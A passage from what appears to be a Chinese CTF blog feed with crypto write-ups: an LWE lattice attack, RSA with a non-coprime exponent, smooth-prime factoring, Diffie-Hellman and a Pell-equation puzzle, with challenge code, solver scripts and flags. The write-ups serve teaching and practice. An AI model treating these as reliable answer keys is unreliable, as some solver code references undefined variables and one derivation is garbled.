<span class="built_in">range</span>(<span class="number">0</span>,n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,n):</span><br><span class="line">                <span class="keyword">if</span> i&lt;j:</span><br><span class="line">                    A[i,j] = random.randint(<span class="number">1</span>,<span class="number">1000</span>)</span><br><span class="line">                <span class="keyword">if</span> i==j:</span><br><span class="line">                    A[i,j] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> A</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_U2</span>():</span><br><span class="line">        A = Matrix(ZZ, n, n)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,n):</span><br><span class="line">                <span class="keyword">if</span> i&gt;j:</span><br><span class="line">                    A[i,j] = random.randint(<span class="number">1</span>,<span class="number">1000</span>)</span><br><span class="line">                <span class="keyword">if</span> i==j:</span><br><span class="line">                    A[i,j] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> A</span><br><span class="line">    <span class="keyword">return</span> get_U1()*get_U2()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_public_key</span>():</span><br><span class="line">    U = get_random_U(<span class="number">9</span>)</span><br><span class="line">    V = matrix(V)</span><br><span class="line">    W = V*U</span><br><span class="line">    <span class="keyword">return</span> W</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_random_r</span>():</span><br><span class="line">    n = <span class="number">9</span></span><br><span class="line">    delta = <span class="number">4</span></span><br><span class="line">    r = random_vector(ZZ, n, x=-delta+<span class="number">1</span>, y=delta)</span><br><span class="line">    r = matrix(r)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>():</span><br><span class="line">    M = [getPrime(<span class="number">10</span>)<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>)]</span><br><span class="line">    m = matrix(M)</span><br><span class="line">    W = get_public_key()</span><br><span class="line">    r = get_random_r()</span><br><span class="line">    e = m*W+r</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>,e)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;W =&quot;</span>,W)</span><br><span class="line">    <span class="keyword">return</span> M</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_encrypt</span>():</span><br><span class="line">    M = encrypt()</span><br><span class="line">    key = hashlib.sha256(<span class="built_in">str</span>(M).encode()).digest()</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    c = cipher.encrypt(flag).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,c)</span><br><span class="line">new_encrypt()</span><br><span class="line"><span class="comment">#e = [151991736758354 115130361237591  58905390613532 130965235357066  74614897867998  48099459442369  45894485782943   7933340009592     25794185638]</span></span><br><span class="line"><span class="comment">#W = [-10150241248 -11679953514  -8802490385 -12260198788 -10290571893   -334269043 -11669932300  -2158827458     -7021995]</span></span><br><span class="line"><span class="comment">#[ 52255960212  48054224859  28230779201  43264260760  20836572799   8191198018  14000400181   4370731005     14251110]</span></span><br><span class="line"><span class="comment">#[  2274129180  -1678741826  -1009050115   1858488045    978763435   4717368685   -561197285  -1999440633     -6540190]</span></span><br><span class="line"><span class="comment">#[ 45454841384  34351838833  19058600591  39744104894  21481706222  14785555279  13193105539   2306952916      7501297]</span></span><br><span class="line"><span class="comment">#[-16804706629 -13041485360  -8292982763 -16801260566  -9211427035  -4808377155  -6530124040  -2572433293     -8393737]</span></span><br><span class="line"><span class="comment">#[ 28223439540  19293284310   5217202426  27179839904  23182044384  10788207024  18495479452   4007452688     13046387]</span></span><br><span class="line"><span class="comment">#[   968256091  -1507028552   1677187853   8685590653   9696793863   2942265602  10534454095   2668834317      8694828]</span></span><br><span class="line"><span class="comment">#[ 33556338459  26577210571  16558795385  28327066095  10684900266   9113388576   2446282316   -173705548      -577070]</span></span><br><span class="line"><span class="comment">#[ 35404775180  32321129676  15071970630  24947264815  14402999486   5857384379  10620159241   2408185012      7841686]</span></span><br><span class="line"><span class="comment">#c =1070260d8986d5e3c4b7e672a6f1ef2c185c7fff682f99cc4a8e49cfce168aa0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.modules.free_module_integer <span class="keyword">import</span> IntegerLattice</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c =1070260d8986d5e3c4b7e672a6f1ef2c185c7fff682f99cc4a8e49cfce168aa0</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Babai</span>(<span class="params">L, w</span>):</span><br><span class="line">    G, _ = L.gram_schmidt()</span><br><span class="line">    t = w</span><br><span class="line">    i = L.nrows() - <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> i &gt;= <span class="number">0</span>:</span><br><span class="line">        x = (w*G[i]) / G[i].norm()^<span class="number">2</span></span><br><span class="line">        w = w - matrix(ZZ,<span class="built_in">int</span>(<span class="built_in">round</span>(<span class="built_in">float</span>(x[<span class="number">0</span>]) )) * L[i])</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> t - w</span><br><span class="line"></span><br><span class="line">W = [[-<span class="number">10150241248</span> ,-<span class="number">11679953514</span> , -<span class="number">8802490385</span> ,-<span class="number">12260198788</span> ,-<span class="number">10290571893</span>  , -<span class="number">334269043</span>, -<span class="number">11669932300</span> , -<span class="number">2158827458</span> ,    -<span class="number">7021995</span>],</span><br><span class="line">[ <span class="number">52255960212</span> , <span class="number">48054224859</span> , <span class="number">28230779201</span> , <span class="number">43264260760</span> , <span class="number">20836572799</span> ,  <span class="number">8191198018</span> , <span class="number">14000400181</span> ,  <span class="number">4370731005</span>  ,   <span class="number">14251110</span>],</span><br><span class="line">[  <span class="number">2274129180</span> , -<span class="number">1678741826</span> , -<span class="number">1009050115</span> ,  <span class="number">1858488045</span>  ,  <span class="number">978763435</span> ,  <span class="number">4717368685</span> ,  -<span class="number">561197285</span> , -<span class="number">1999440633</span>  ,   -<span class="number">6540190</span>],</span><br><span class="line">[ <span class="number">45454841384</span> , <span class="number">34351838833</span> , <span class="number">19058600591</span> , <span class="number">39744104894</span> , <span class="number">21481706222</span> , <span class="number">14785555279</span> , <span class="number">13193105539</span>  , <span class="number">2306952916</span>   ,   <span class="number">7501297</span>],</span><br><span class="line">[-<span class="number">16804706629</span> ,-<span class="number">13041485360</span> , -<span class="number">8292982763</span> ,-<span class="number">16801260566</span> , -<span class="number">9211427035</span> , -<span class="number">4808377155</span> , -<span class="number">6530124040</span> , -<span class="number">2572433293</span>  ,   -<span class="number">8393737</span>],</span><br><span class="line">[ <span class="number">28223439540</span> , <span class="number">19293284310</span>  , <span class="number">5217202426</span> , <span class="number">27179839904</span> , <span class="number">23182044384</span> , <span class="number">10788207024</span> , <span class="number">18495479452</span> ,  <span class="number">4007452688</span>   ,  <span class="number">13046387</span>],</span><br><span class="line">[   <span class="number">968256091</span> , -<span class="number">1507028552</span> ,  <span class="number">1677187853</span>  , <span class="number">8685590653</span> ,  <span class="number">9696793863</span> ,  <span class="number">2942265602</span> , <span class="number">10534454095</span> ,  <span class="number">2668834317</span>   ,   <span class="number">8694828</span>],</span><br><span class="line">[ <span class="number">33556338459</span> , <span class="number">26577210571</span> , <span class="number">16558795385</span> , <span class="number">28327066095</span> , <span class="number">10684900266</span>  , <span class="number">9113388576</span>  , <span class="number">2446282316</span> ,  -<span class="number">173705548</span>   ,   -<span class="number">577070</span>],</span><br><span class="line">[ <span class="number">35404775180</span> , <span class="number">32321129676</span> , <span class="number">15071970630</span> , <span class="number">24947264815</span> , <span class="number">14402999486</span> ,  <span class="number">5857384379</span> , <span class="number">10620159241</span>  , <span class="number">2408185012</span>   ,   <span class="number">7841686</span>]]</span><br><span class="line">e = [<span class="number">151991736758354</span> ,<span class="number">115130361237591</span> , <span class="number">58905390613532</span> ,<span class="number">130965235357066</span> , <span class="number">74614897867998</span> , <span class="number">48099459442369</span> , <span class="number">45894485782943</span>  , <span class="number">7933340009592</span>   ,  <span class="number">25794185638</span>]</span><br><span class="line"></span><br><span class="line">W = matrix(ZZ, W)</span><br><span class="line">e = matrix(ZZ, e)</span><br><span class="line"></span><br><span class="line">Q = W.LLL()</span><br><span class="line">cvp = Babai(Q,e)</span><br><span class="line"></span><br><span class="line">res = Matrix(W)</span><br><span class="line">res = FLAG.solve_left(cvp)</span><br><span class="line">key = hashlib.sha256(<span class="built_in">str</span>(a).encode()).digest()</span><br><span class="line">key</span><br><span class="line"><span class="comment">#b&#x27;k\x86\xb2s\xff4\xfc\xe1\x9dk\x80N\xffZ?WG\xad\xa4\xea\xa2/\x1dI\xc0\x1eR\xdd\xb7\x87[K&#x27;</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">flag = cipher.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag =&quot;</span>,flag)</span><br><span class="line"><span class="comment">#flag&#123;be5152d04a49234a251956a32b&#125;</span></span><br></pre></td></tr></table></figure>
<p>这里没有模数，如果有模数就把U扩展一下，在底下加一个p的对角阵，接着用格基规约再babai算法就可以了</p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Lattice</tag>
        <tag>lwe</tag>
      </tags>
  </entry>
  <entry>
    <title>做题</title>
    <url>/2021/10/26/2021/%E5%81%9A%E9%A2%98/</url>
    <content><![CDATA[<p>做题记录</p>
<span id="more"></span>
<h1 id="defective-rsa">Defective RSA</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, inverse, bytes_to_long</span><br><span class="line"></span><br><span class="line">e = <span class="number">1440</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">flag</span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag), e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q = <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># e = 1440</span></span><br><span class="line"><span class="comment"># p = 108625855303776649594296217762606721187040584561417095690198042179830062402629658962879350820293908057921799564638749647771368411506723288839177992685299661714871016652680397728777113391224594324895682408827010145323030026082761062500181476560183634668138131801648343275565223565977246710777427583719180083291</span></span><br><span class="line"><span class="comment"># q = 124798714298572197477112002336936373035171283115049515725599555617056486296944840825233421484520319540831045007911288562132502591989600480131168074514155585416785836380683166987568696042676261271645077182221098718286132972014887153999243085898461063988679608552066508889401992413931814407841256822078696283307</span></span><br><span class="line"><span class="comment"># c = 4293606144359418817736495518573956045055950439046955515371898146152322502185230451389572608386931924257325505819171116011649046442643872945953560994241654388422410626170474919026755694736722826526735721078136605822710062385234124626978157043892554030381907741335072033672799019807449664770833149118405216955508166023135740085638364296590030244412603570120626455502803633568769117033633691251863952272305904666711949672819104143350385792786745943339525077987002410804383449669449479498326161988207955152893663022347871373738691699497135077946326510254675142300512375907387958624047470418647049735737979399600182827754</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>gcd(e,phi)=20，直接构造多项式环<span class="math display">\[f =
x^20-c\;mod\;p(q)\]</span>，之后对结构用crt即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">1440</span></span><br><span class="line">p = <span class="number">108625855303776649594296217762606721187040584561417095690198042179830062402629658962879350820293908057921799564638749647771368411506723288839177992685299661714871016652680397728777113391224594324895682408827010145323030026082761062500181476560183634668138131801648343275565223565977246710777427583719180083291</span></span><br><span class="line">q = <span class="number">124798714298572197477112002336936373035171283115049515725599555617056486296944840825233421484520319540831045007911288562132502591989600480131168074514155585416785836380683166987568696042676261271645077182221098718286132972014887153999243085898461063988679608552066508889401992413931814407841256822078696283307</span></span><br><span class="line">c = <span class="number">4293606144359418817736495518573956045055950439046955515371898146152322502185230451389572608386931924257325505819171116011649046442643872945953560994241654388422410626170474919026755694736722826526735721078136605822710062385234124626978157043892554030381907741335072033672799019807449664770833149118405216955508166023135740085638364296590030244412603570120626455502803633568769117033633691251863952272305904666711949672819104143350385792786745943339525077987002410804383449669449479498326161988207955152893663022347871373738691699497135077946326510254675142300512375907387958624047470418647049735737979399600182827754</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br><span class="line"> </span><br><span class="line">R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">f = x ^e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res2 = f.roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        m=crt(<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),p,q)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>也可以这么构造： <span class="math display">\[
(m * x) ^ e \;= \;c\;(mod \;n)\\
      x ^ e \;= \;1  \;(mod \;n)
\]</span> 然后寻求这个新多项式下的解x即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">roots_of_unity</span>(<span class="params">e, phi, n, rounds=<span class="number">500</span></span>):</span><br><span class="line">   </span><br><span class="line">    phi_coprime = phi</span><br><span class="line">    <span class="keyword">while</span> cun.GCD(phi_coprime, e) != <span class="number">1</span>:</span><br><span class="line">        phi_coprime //= cun.GCD(phi_coprime, e)</span><br><span class="line"></span><br><span class="line">    roots = <span class="built_in">set</span>(<span class="built_in">pow</span>(i, phi_coprime, n) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, rounds))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">all</span>(<span class="built_in">pow</span>(root, e, n) == <span class="number">1</span> <span class="keyword">for</span> root <span class="keyword">in</span> roots)</span><br><span class="line">    <span class="keyword">return</span> roots, phi_coprime</span><br></pre></td></tr></table></figure>
<h1 id="pollards_rsa">pollards_RSA</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> is_prime, mpz</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"></span><br><span class="line">rand = SystemRandom()</span><br><span class="line">PRIMES = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">53</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_prime</span>(<span class="params">bit_length</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = mpz(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">while</span> x.bit_length() &lt; bit_length:</span><br><span class="line">            x *= rand.choice(PRIMES)</span><br><span class="line">        <span class="keyword">if</span> is_prime(x + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> x + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">p = get_prime(<span class="number">1024</span>)</span><br><span class="line">q = get_prime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>用pollards_rho方法分解n。这也说明了用小素数来生成素数非常不安全</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> mul</span><br><span class="line"></span><br><span class="line">PRIMES = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">53</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pollards_rho</span>(<span class="params">n</span>):</span><br><span class="line">    x = <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        x = <span class="built_in">pow</span>(<span class="built_in">pow</span>(x, reduce(mul, PRIMES), n),reduce(mul, PRIMES),n)</span><br><span class="line">        g = gmpy2.gcd(x - <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> &lt; g &lt; n:</span><br><span class="line">            <span class="built_in">print</span>(_)</span><br><span class="line">            <span class="keyword">return</span> g</span><br></pre></td></tr></table></figure>
<p>x求值那里可以从两轮改成一轮，两轮的目的是加快速度，但有时候可能会错失解，对这题来说问题不大</p>
<h1 id="key-exchange">Key exchange</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mac/Linux: pip3 install pycryptodome</span></span><br><span class="line"><span class="comment"># Windows: py -m pip install pycryptodome</span></span><br><span class="line"><span class="keyword">import</span> Crypto.Util.number <span class="keyword">as</span> cun</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">rand = random.SystemRandom()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">diffie_hellman</span>(<span class="params">message: <span class="built_in">bytes</span></span>):</span><br><span class="line">    p = cun.getPrime(<span class="number">512</span>)</span><br><span class="line">    g = <span class="number">5</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;g = <span class="subst">&#123;g&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    a = rand.randrange(<span class="number">2</span>, p - <span class="number">1</span>)  <span class="comment"># private key</span></span><br><span class="line">    A = <span class="built_in">pow</span>(g, a, p)  <span class="comment"># public key</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># g ^ a === A  (mod p)</span></span><br><span class="line">    <span class="comment"># It&#x27;s computationally infeasible for anyone else to derive a from A</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;A = <span class="subst">&#123;A&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    B = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Give me your public key B: &quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">1</span> &lt; B &lt; p - <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Suspicious public key&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># B ^ a === (g ^ b) ^ a === g ^ (ab)  (mod p)</span></span><br><span class="line">    <span class="comment"># Nobody can derive this shared secret except us!</span></span><br><span class="line">    shared_secret = <span class="built_in">pow</span>(B, a, p)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Use AES, a symmetric cipher, to encrypt the flag using the shared key</span></span><br><span class="line">    key = hashlib.sha1(cun.long_to_bytes(shared_secret)).digest()[:<span class="number">16</span>]</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    ciphertext = cipher.encrypt(message)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ciphertext = <span class="subst">&#123;ciphertext.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I&#x27;m going to send you the flag.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;However, I noticed that an FBI agent has been eavesdropping on my messages,&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;so I&#x27;m going to send it to you in a way that ONLY YOU can decrypt the flag.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line">diffie_hellman(FLAG)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>就是个最基本的DH密钥交换，知道概念即可</p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>一……二……开门！</title>
    <url>/2021/07/28/2021/%E4%B8%80%E2%80%A6%E2%80%A6%E4%BA%8C%E2%80%A6%E2%80%A6%E5%BC%80%E9%97%A8%EF%BC%81/</url>
    <content><![CDATA[<p>CTFshow上的新题，搞了一天</p>
<span id="more"></span>
<h1 id="题目">题目</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> door_sum <span class="keyword">import</span> door_sum</span><br><span class="line"></span><br><span class="line"><span class="comment"># door_sum(l, d, n): calculate the sum of an arithmetic sequence</span></span><br><span class="line"><span class="comment"># with `l` being the first number, `d` being the common difference,</span></span><br><span class="line"><span class="comment"># and `n` being the number of terms</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Sanity check:</span></span><br><span class="line"><span class="keyword">assert</span> door_sum(<span class="number">1</span>, <span class="number">1</span>, <span class="number">100</span>) == <span class="number">5050</span></span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;HELLO!</span></span><br><span class="line"><span class="string">Open the door, and I&#x27;ll show you my flag!</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			<span class="built_in">print</span>(WELCOME)</span><br><span class="line">			n_1 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;n_1 = &#x27;</span>))</span><br><span class="line">			n_2 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;n_2 = &#x27;</span>))</span><br><span class="line">			<span class="keyword">if</span> (n_1 &gt; <span class="number">2</span> ** <span class="number">0x1337</span> <span class="keyword">and</span> n_2 &gt; <span class="number">2</span> ** <span class="number">0x1337</span> <span class="keyword">and</span> door_sum(<span class="number">1</span>, <span class="number">1</span>, n_1) == <span class="number">0x1337</span> * door_sum(<span class="number">1</span>, <span class="number">2</span>, n_2)):</span><br><span class="line">				<span class="built_in">print</span>(<span class="string">&#x27;OKOK! YOU GOT THE FLAG:&#x27;</span>)</span><br><span class="line">				<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">					<span class="built_in">print</span>(f.read())</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="built_in">print</span>(<span class="string">&#x27;Uh-Oh, the door is not opened...&#x27;</span>)</span><br><span class="line">		<span class="keyword">except</span> Exception:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;NONONO!&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h1 id="分析">分析</h1>
<p>door_sum可以写成等差数列的和</p>
<p>注意door_sum里的n是项数！！！</p>
<p>题目的要求是两个数均大于2**4919并且第一个数的数列和是第二个数列和的4919倍
$$ x_n=x_1+d(n-1)</p>
<p>\ S_n=n=()n = \则S_{n1}= \S_{n2}=
\已知S_{n1}=4919*S_{n2},且d_1=1,d_2=2,x_1=1 \则=4919n_2^2 \ =n2 $$</p>
<p>走到这里发现走不通了，毕竟是要爆破的，对于这个数量级依旧很难出解。因为要加快爆破速度，了解到佩尔方程：</p>
<h2 id="佩尔方程">佩尔方程</h2>
<p><span class="math display">\[
定义：形如x^2 − d y^2=1(d&gt;1,且d不是完全平方数)\\
要求第一类佩尔方程的解都是正整数解,也即( x , y ) , x &gt; 0 , y &gt; 0
\]</span></p>
<p>显然方程有无数组解，如何求最小解？ <span class="math display">\[
把方程化为x=\sqrt{1+dy^2}\\
从y=1开始枚举，如果\sqrt{1+dy^2}是整数，那么此时(x,y)就是最小整数解(x_1,y_1)
\]</span> 如何得到所有的解？</p>
<p>迭代公式： <span class="math display">\[
x_n=x_{n-1}x_1+dy_{n-1}y_1\\
y_n=x_{n-1}y_1+y_{n-1}x_1
\]</span>
但如果用这个公式求解，时间复杂度依旧是O(n)，当n很大时还是跑不出来，所以使用矩阵快速幂，以O(logn)的时间复杂度求解：
<span class="math display">\[
\left[
\begin{matrix}
x_n\\
y_n
\end{matrix}
  \right] \tag{2}=
   \left[
\begin{matrix}
x_1&amp;d*y_1\\
y_1&amp;x_1
\end{matrix}
  \right]^{n-1}
   \left[
\begin{matrix}
x_1\\
y_1
\end{matrix}
  \right]
\]</span></p>
<h2 id="解">解</h2>
<p>改变一下推法： <span class="math display">\[
\frac{n_1^2+n_1}{2}=4919n_2^2
\\(n_1+\frac{1}{2})^2-\frac{1}{2}=9838n_2^2
\\(2n_1+1)^2-4*9838n_2^2=1
\]</span> 得到了佩尔方程的表达式，之后使用连分数的性质计算得到了最小解：
<span class="math display">\[
(x_1,y_1)=\\(2662019309411216232806345449321879270495478346383,
26838472360889124413883226557207387537524821524)
\]</span> 可以看到还是很小的（比起2^0x1337)</p>
<p>完整代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_mini_solution</span>(<span class="params">d</span>):</span><br><span class="line">    m=<span class="built_in">int</span>(d**<span class="number">0.5</span>)</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    a=[]</span><br><span class="line">    a.append(m)</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    b=m</span><br><span class="line">    c=<span class="number">1</span></span><br><span class="line">    sq=d**<span class="number">0.5</span></span><br><span class="line">    <span class="keyword">while</span>(a[i-<span class="number">1</span>]!=<span class="number">2</span>*a[<span class="number">0</span>]):</span><br><span class="line">        c=(d-b*b)/c</span><br><span class="line">        tmp=(sq+b)/c</span><br><span class="line">        a.append(<span class="built_in">int</span>(tmp))</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        b=a[i-<span class="number">1</span>]*c-b</span><br><span class="line">    <span class="keyword">del</span> a[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    p=[m]</span><br><span class="line">    q=[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(a)):</span><br><span class="line">        <span class="keyword">if</span> j==<span class="number">1</span>:</span><br><span class="line">            p.append(a[j]*p[<span class="number">0</span>]+<span class="number">1</span>)</span><br><span class="line">            q.append(a[j]*q[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p.append(a[j]*p[j-<span class="number">1</span>]+p[j-<span class="number">2</span>])</span><br><span class="line">            q.append(a[j]*q[j-<span class="number">1</span>]+q[j-<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a)%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> p[-<span class="number">1</span>],q[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">         <span class="keyword">return</span> <span class="number">2</span>*p[-<span class="number">1</span>]**<span class="number">2</span>,<span class="number">2</span>*p[-<span class="number">1</span>]*q[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mulMatrix</span>(<span class="params">x,y</span>):     <span class="comment">#二阶矩阵乘法</span></span><br><span class="line">    ans = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span 